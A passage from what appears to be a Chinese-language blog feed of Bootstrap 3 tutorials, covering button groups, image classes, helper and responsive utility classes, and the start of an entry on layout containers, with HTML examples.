disabled&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>禁用链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-lg&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>原始链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-lg disabled&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>禁用的原始链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>可以在 <a>、<button> 或 <input> 元素上使用按钮 class。但是建议在 <button> 元素上使用按钮 class，避免跨浏览器的不一致性问题。</strong></p><h3 id="1-4-按钮组"><a href="#1-4-按钮组" class="headerlink" title="1.4 按钮组"></a>1.4 按钮组</h3><p>在 div 中直接使用 <code>.btn-group</code> 可以创建按钮组。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Apple<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Samsung<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Sony<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-4-1-控制按钮组大小"><a href="#1-4-1-控制按钮组大小" class="headerlink" title="1.4.1 控制按钮组大小"></a>1.4.1 控制按钮组大小</h4><p>使用 <code>.btn-group-lg|sm|xs</code> 来控制按钮组的大小。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group btn-group-lg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Apple<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Samsung<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Sony<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-4-2-设置按钮位置"><a href="#1-4-2-设置按钮位置" class="headerlink" title="1.4.2 设置按钮位置"></a>1.4.2 设置按钮位置</h4><p>设置垂直方向的按钮可以通过 <code>.btn-group-vertical</code> 类来设置。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group-vertical&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Apple<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Samsung<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Sony<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><h3 id="1-5-自适应大小的按钮组"><a href="#1-5-自适应大小的按钮组" class="headerlink" title="1.5 自适应大小的按钮组"></a>1.5 自适应大小的按钮组</h3><p>可以通过 <code>.btn-group-justified</code> 类来设置自适应大小的按钮组。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group btn-group-justified&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Apple<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Samsung<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Sony<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>注意:</strong> 如果是 <code>&lt;button&gt;</code> 元素, 需要在外层使用 <code>.btn-group</code> 类来包裹。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group btn-group-justified&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Apple<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Samsung<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Sony<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="2-图片"><a href="#2-图片" class="headerlink" title="2.图片"></a>2.图片</h2><p>在 Bootstrap 版本 3 中，通过为图片添加 <code>.img-responsive</code> 类可以让图片支持响应式布局。其实质是为图片设置了 <code>max-width: 100%;</code>、 <code>height: auto;</code> 和 <code>display: block;</code> 属性，从而让图片在其父元素中更好的缩放。</p><h3 id="2-1-图片形状"><a href="#2-1-图片形状" class="headerlink" title="2.1 图片形状"></a>2.1 图片形状</h3><p>Bootstrap 提供了三个可对图片应用简单样式的 class。</p><ul><li><code>.img-rounded</code>：添加 <em>border-radius:6px</em> 来获得图片圆角。</li><li><code>.img-circle</code>：添加 <em>border-radius:50%</em> 来让整个图片变成圆形。</li><li><code>.img-thumbnail</code>：添加一些内边距（padding）和一个灰色的边框。</li></ul><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;img-rounded&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;img-circle&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;img-thumbnail&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-2-响应式图片"><a href="#2-2-响应式图片" class="headerlink" title="2.2 响应式图片"></a>2.2 响应式图片</h3><p>添加 <code>.img-responsive</code> 类来让图片支持响应式设计。 图片将很好地扩展到父元素。如果需要让使用了 <code>.img-responsive</code> 类的图片水平居中，请使用 <code>.center-block</code> 类，不要用 <code>.text-center</code>。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;cinqueterre.jpg&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;img-responsive&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Cinque Terre&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="3-BootStrap辅助类"><a href="#3-BootStrap辅助类" class="headerlink" title="3.BootStrap辅助类"></a>3.BootStrap辅助类</h2><p>不同的文本颜色。如果文本是个链接鼠标移动到文本上会变暗。</p><table><thead><tr><th align="left">类</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">.text-muted</td><td align="left">“text-muted” 类的文本样式</td></tr><tr><td align="left">.text-primary</td><td align="left">“text-primary” 类的文本样式</td></tr><tr><td align="left">.text-success</td><td align="left">“text-success” 类的文本样式</td></tr><tr><td align="left">.text-info</td><td align="left">“text-info” 类的文本样式</td></tr><tr><td align="left">.text-warning</td><td align="left">“text-warning” 类的文本样式</td></tr><tr><td align="left">.text-danger</td><td align="left">“text-danger” 类的文本样式</td></tr></tbody></table><p>不同的背景颜色。 如果文本是个链接鼠标移动到文本上会变暗。</p><table><thead><tr><th align="left">类</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">.bg-primary</td><td align="left">表格单元格使用了 “bg-primary” 类</td></tr><tr><td align="left">.bg-success</td><td align="left">表格单元格使用了 “bg-success” 类</td></tr><tr><td align="left">.bg-info</td><td align="left">表格单元格使用了 “bg-info” 类</td></tr><tr><td align="left">.bg-warning</td><td align="left">表格单元格使用了 “bg-warning” 类</td></tr><tr><td align="left">.bg-danger</td><td align="left">表格单元格使用了 “bg-danger” 类</td></tr></tbody></table><p>其他的一些辅助类。</p><table><thead><tr><th align="left">类</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">.pull-left</td><td align="left">元素浮动到左边</td></tr><tr><td align="left">.pull-right</td><td align="left">元素浮动到右边</td></tr><tr><td align="left">.center-block</td><td align="left">设置元素为 display:block 并居中显示</td></tr><tr><td align="left">.clearfix</td><td align="left">清除浮动</td></tr><tr><td align="left">.show</td><td align="left">强制元素显示</td></tr><tr><td align="left">.hidden</td><td align="left">强制元素隐藏</td></tr><tr><td align="left">.sr-only</td><td align="left">除了屏幕阅读器外，其他设备上隐藏元素</td></tr><tr><td align="left">.sr-only-focusable</td><td align="left">与 .sr-only 类结合使用，在元素获取焦点时显示(如：键盘操作的用户)</td></tr><tr><td align="left">.text-hide</td><td align="left">将页面元素所包含的文本内容替换为背景图</td></tr><tr><td align="left">.close</td><td align="left">显示关闭按钮</td></tr><tr><td align="left">.caret</td><td align="left">显示下拉式功能</td></tr></tbody></table><h3 id="3-1-关闭图标"><a href="#3-1-关闭图标" class="headerlink" title="3.1 关闭图标"></a>3.1 关闭图标</h3><p>使用通用的关闭图标来关闭模态框和警告框。使用 <code>close</code> 得到关闭图标。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>关闭图标实例<br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;close&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>    <span class="hljs-symbol">&amp;times;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-2-插入符"><a href="#3-2-插入符" class="headerlink" title="3.2 插入符"></a>3.2 插入符</h3><p>使用插入符表示下拉功能和方向。使用 <code>caret</code> 。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>插入符实例<br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-3-快速浮动"><a href="#3-3-快速浮动" class="headerlink" title="3.3 快速浮动"></a>3.3 快速浮动</h3><p>分别使用 <code>pull-left</code> 或 <code>pull-right</code> 来把元素向左或向右浮动。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pull-left&quot;</span>&gt;</span><br>  向左快速浮动<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pull-right&quot;</span>&gt;</span><br>  向右快速浮动<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>如需对齐导航栏中的组件，使用 <code>.navbar-left</code> 或 <code>.navbar-right</code> 代替。</p><h3 id="3-4-清除浮动"><a href="#3-4-清除浮动" class="headerlink" title="3.4 清除浮动"></a>3.4 清除浮动</h3><p>使用 <code>.clearfix</code>。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clearfix&quot;</span>  <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background: #D8D8D8;border: 1px solid #000;padding: 10px;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pull-left&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background:#58D3F7;&quot;</span>&gt;</span><br>    向左快速浮动<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pull-right&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background: #DA81F5;&quot;</span>&gt;</span><br>    向右快速浮动<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-5-内容居中"><a href="#3-5-内容居中" class="headerlink" title="3.5 内容居中"></a>3.5 内容居中</h3><p>使用 <code>center-block</code> 来居中元素。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;center-block&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:200px;background-color:#ccc;&quot;</span>&gt;</span><br>    这是 center-block 实例<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-6-显示和隐藏内容"><a href="#3-6-显示和隐藏内容" class="headerlink" title="3.6 显示和隐藏内容"></a>3.6 显示和隐藏内容</h3><p>使用 <code>.show</code> 和 <code>.hidden</code> 来强行设置元素显示或隐藏（包括屏幕阅读器）。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;padding: 91px 100px 19px 50px;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;show&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-left:10px;width:300px;background-color:#ccc;&quot;</span>&gt;</span><br>    这是 show class 的实例<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:200px;background-color:#ccc;&quot;</span>&gt;</span><br>    这是 hide class 的实例<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-7-图片替换"><a href="#3-7-图片替换" class="headerlink" title="3.7 图片替换"></a>3.7 图片替换</h3><p>使用 <code>.text-hide</code> 类或对应的 mixin 可以用来将元素的文本内容替换为一张背景图。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-hide&quot;</span>&gt;</span>Custom heading<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>// Usage as a mixin<br>.heading &#123;<br>  .text-hide();<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="4-响应式工具"><a href="#4-响应式工具" class="headerlink" title="4.响应式工具"></a>4.响应式工具</h2><p>通过单独或联合使用以下列出的类，可以针对不同屏幕尺寸隐藏或显示页面内容。</p><table><thead><tr><th align="left"></th><th align="left">超小屏幕手机 (&lt;768px)</th><th align="left">小屏幕平板 (≥768px)</th><th align="left">中等屏幕桌面 (≥992px)</th><th align="left">大屏幕桌面 (≥1200px)</th></tr></thead><tbody><tr><td align="left"><code>.visible-xs-*</code></td><td align="left">可见</td><td align="left">隐藏</td><td align="left">隐藏</td><td align="left">隐藏</td></tr><tr><td align="left"><code>.visible-sm-*</code></td><td align="left">隐藏</td><td align="left">可见</td><td align="left">隐藏</td><td align="left">隐藏</td></tr><tr><td align="left"><code>.visible-md-*</code></td><td align="left">隐藏</td><td align="left">隐藏</td><td align="left">可见</td><td align="left">隐藏</td></tr><tr><td align="left"><code>.visible-lg-*</code></td><td align="left">隐藏</td><td align="left">隐藏</td><td align="left">隐藏</td><td align="left">可见</td></tr><tr><td align="left"><code>.hidden-xs</code></td><td align="left">隐藏</td><td align="left">可见</td><td align="left">可见</td><td align="left">可见</td></tr><tr><td align="left"><code>.hidden-sm</code></td><td align="left">可见</td><td align="left">隐藏</td><td align="left">可见</td><td align="left">可见</td></tr><tr><td align="left"><code>.hidden-md</code></td><td align="left">可见</td><td align="left">可见</td><td align="left">隐藏</td><td align="left">可见</td></tr><tr><td align="left"><code>.hidden-lg</code></td><td align="left">可见</td><td align="left">可见</td><td align="left">可见</td><td align="left">隐藏</td></tr></tbody></table><p>从 v3.2.0 版本起，形如 <code>.visible-*-*</code> 的类针对每种屏幕大小都有了三种变体，每个针对 CSS 中不同的 <code>display</code> 属性，列表如下：</p><table><thead><tr><th align="left">类组</th><th align="left">CSS <code>display</code></th></tr></thead><tbody><tr><td align="left"><code>.visible-*-block</code></td><td align="left"><code>display: block;</code></td></tr><tr><td align="left"><code>.visible-*-inline</code></td><td align="left"><code>display: inline;</code></td></tr><tr><td align="left"><code>.visible-*-inline-block</code></td><td align="left"><code>display: inline-block;</code></td></tr></tbody></table><p>因此，以超小屏幕（<code>xs</code>）为例，可用的 <code>.visible-*-*</code> 类是：<code>.visible-xs-block</code>、<code>.visible-xs-inline</code> 和 <code>.visible-xs-inline-block</code>。</p><p><code>.visible-xs</code>、<code>.visible-sm</code>、<code>.visible-md</code> 和 <code>.visible-lg</code> 类也同时存在。但是<strong>从 v3.2.0 版本开始不再建议使用</strong>。除了 <code>&lt;table&gt;</code> 相关的元素的特殊情况外，它们与 <code>.visible-*-block</code> 大体相同。</p>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
      <tag>BootStrap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（十八）BootStrap-CSS全局样式(一)</title>
    <link href="/2021/08/17/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E5%85%AB%EF%BC%89BootStrap-CSS%E5%85%A8%E5%B1%80%E6%A0%B7%E5%BC%8F(%E4%B8%80)/"/>
    <url>/2021/08/17/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E5%85%AB%EF%BC%89BootStrap-CSS%E5%85%A8%E5%B1%80%E6%A0%B7%E5%BC%8F(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<p>Bootstrap 是最受欢迎的 HTML、CSS 和 JS 框架，用于开发响应式布局、移动设备优先的 WEB 项目。Bootstrap是基于HTML、CSS、JavaScript 开发的简洁、直观、强悍的前端开发框架，使得 Web 开发更加快捷。提供了优雅的HTML和CSS规范。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>** Bootstrap 使用到的某些 HTML 元素和 CSS 属性需要将页面设置为 HTML5 文档类型。 **</p><h2 id="1-布局容器"><a href="#1-布局容器" class="headerlink" title="1.布局容器"></a>1.布局容器</h2><p>Bootstrap 需要为页面内容和栅格系统包裹一个 .container 容器。提供了两个作此用处的类。注意，由于 padding 等属性的原因，这两种 容器类不能互相嵌套。</p><h3 id="1-1-container-类"><a href="#1-1-container-类" class="headerlink" title="1.1 container 类"></a>1.1 container 类</h3><p><code>.container</code> 类用于固定宽度并支持响应式布局的容器。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br>  ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-container-fluid-类"><a href="#1-2-container-fluid-类" class="headerlink" title="1.2 container-fluid 类"></a>1.2 container-fluid 类</h3><p><code>.container-fluid</code> 类用于 100% 宽度，占据全部视口（viewport）的容器。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs 